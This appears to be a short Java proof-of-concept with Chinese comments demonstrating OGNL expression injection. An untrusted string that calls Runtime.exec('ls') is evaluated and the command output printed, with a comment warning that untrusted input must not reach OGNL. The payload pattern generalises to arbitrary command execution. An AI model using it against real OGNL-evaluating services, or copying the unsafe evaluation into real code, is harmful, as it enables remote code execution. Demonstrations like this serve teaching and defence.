package ognl.poc;

import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class OgnlSecurityDemo {

    public static void main(String[] args) {
        // 假设这是从不受信任源获取的输入，不应直接用于OGNL表达式
        String maliciousInput = "@java.lang.Runtime@getRuntime().exec('ls')";

        try {
            // 创建一个空对象作为根对象，因为这里我们是调用静态方法
            Object root = new Object();

            // 创建OGNL上下文
            OgnlContext context = (OgnlContext) Ognl.createDefaultContext(root);

            // 解析OGNL表达式
            Object tree = Ognl.parseExpression(maliciousInput);

            // 执行OGNL表达式，得到Process对象
            Process process = (Process) Ognl.getValue(tree, context, root);

            // 读取命令执行的输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // 确保关闭流
            reader.close();
            process.waitFor();

        } catch (OgnlException | IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}